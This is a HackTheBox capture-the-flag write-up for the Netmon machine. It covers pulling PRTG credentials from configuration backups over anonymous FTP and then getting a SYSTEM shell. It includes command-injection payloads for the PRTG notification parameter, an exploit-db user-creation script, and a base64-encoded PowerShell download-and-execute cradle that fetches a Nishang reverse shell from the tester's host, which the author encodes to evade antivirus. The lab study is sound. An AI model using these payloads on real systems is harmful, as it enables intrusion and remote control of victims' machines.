# HackTheBox - Netmon

### What I Learned

1. You can grep before and after the lines where the search term is found
2. Nishang shells are excellent pre-built shells for red teaming
3. Use base 64 encoding of downloading shells to get past AV

<details>
  <summary><strong>Writeup Summary</strong></summary>
  Scan the machine and find an FTP process running and access it on port 21. Find the netmon config files are located and find a network monitor file. Search the backup config file and find a user/pass combo. It doesen't work but ends in 2018, so try bumping it up to 2019 and it does work. Use it to login to the prtg network admin console.

There are 2 ways to get root from here.

1. Use an exploit from exploitdb to get a root shell
2. Use the notification exploit. Create a reverse shell using msfvenom. Base64 encode the command to upload the PRTG notification command. Take the base64 string and run it through the parameter on the notification. Run the downloaded file and get a reverse shell.

</details>
<br>

## Writeup

Nmap scan

- `nmap -sV -sC -sT -vv -oA nmap/scan 10.129.230.176`

Find FTP system process running on port 21 with anonymous login allowed
Find Netmon running on port 80

Access the FTP port using

- `ftp anonymous@<IP_ADDR>`

Search for windows LFI files for interesting file

Find where the default Netmon configuration files are located
Find them in the /Windows directory
Download the PRTG Configuration.dat file

- Only available through ftp port
- Get PRTG Configuration.dat

Look for the data directory file for the Network monitor

- https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data
- `cd ProgramData\Paessler\PRTG Network Monitor`

  Download the configuration files using "get PRTG Configuration.dat"

Read the lines of the massive file that contain the word "user"

- `grep -i user PRTG\ Configuration.dat | sed 's/ //g/'|sort -u`

Then look at the lines 5 before and after the word "password" using

- `grep -B5 -A5 -i user PRTG\ Configuration.dat | sed 's/ //g/'|sort -u`

Try the same on the old configuration files and find something

- `grep -B5 -A5 -i user PRTG\ Configuration.old.bak | sed 's/ //g/'|sort -u`

Look a the file using less and find old login information

- less PRTG\ FILENAME.BLAH
- Search for keywords using
  - `/<SEARCHTERM>`

Use the default admin credentials to login to the website - FAILS

Try using smb to login to the machine

- `smbmap -u <USER> -p '<PASS>' -d netmon -H <IP_ADDR>`

Didn't work, so since the password from the backup file was from 2018, try incrementing the year
This is a weird way to do the password. I never would have thought of it unless I had looked it up

- `prtgadmin`
- `PrTg@dmin2018 ----> PrTg@dmin2019`

Now you have access to the console

Find Probe Access key

- F450351E-2115-4B41-80E2-44CB785D4428
  Currently Installed version
- `18.1.37.13946`

Check searchsploit, but there is only one vuln for this version and it is DOS, so not what we want
Then check google, search "CVE prtg network monitor"

- https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=prtg
  - https://www.cve.org/CVERecord?id=CVE-2018-9276

---

First way to get a shell

Use exploitdb to find an exploit that works against the version of PRTG System Administrator

- searchsploit 46527

Run the shell file against the machine to get a new user created

- `Pentest:P3nT3st!`

Then use psexec to login as the created user as a system user

- `impacket-psexec pentest@10.129.230.176`

---

Second way to get a shell

Test ping using the notification exploit
Set the Parameter to

- `test | ping -n 1 <KALI_IP>`

Listen for the ping on Kali using

- `tcpdump -i tun0 icmp`

You have programs that execute, so it works.

Create a reverse shell file in the directory and serve it with Python

- `cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .`
- `cp ./Invoke-PowerShellTcp.ps1 revsh.ps1`
  - Then change the IP address for the reverse shell

Base64 encode the command for the upload in the PRTG notification command

- `echo -n "IEX(new-object net.webclient).downloadstring('http://10.10.14.209:8000/revsh.ps1')" | iconv -t UTF-16LE | base64 -w0`

Then in the parameter function on the webpage, put the command

- `test | IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.209:8000/reverse.ps1')`

Setup a python server to serve the file
Setup a netcat listener on port 8787

Run the command through the parameter on the notification

- `abc.txt | powershell -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMAA5ADoAOAAwADAAMAAvAHIAZQB2AHMAaAAuAHAAcwAxACcAKQA=`

Now you have a system shell
